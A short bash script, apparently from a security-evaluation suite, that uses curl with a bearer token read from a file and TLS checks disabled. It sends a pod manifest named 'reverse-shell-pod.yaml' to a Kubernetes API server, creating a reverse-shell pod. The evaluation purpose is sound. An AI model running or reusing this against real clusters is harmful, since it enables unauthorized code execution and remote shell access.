#!/bin/bash

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SECURITY_EVAL_DIR="$(cd "$SCRIPT_DIR/.." && pwd)"

curl -k -X POST https://172.23.24.76:6443/api/v1/namespaces/cass-operator/pods \
  -H "Authorization: Bearer $(cat "$SCRIPT_DIR/token.txt")" \
  -H "Content-Type: application/yaml" \
  --data-binary @"$SECURITY_EVAL_DIR/ReverseShellAttack/reverse-shell-pod.yaml"
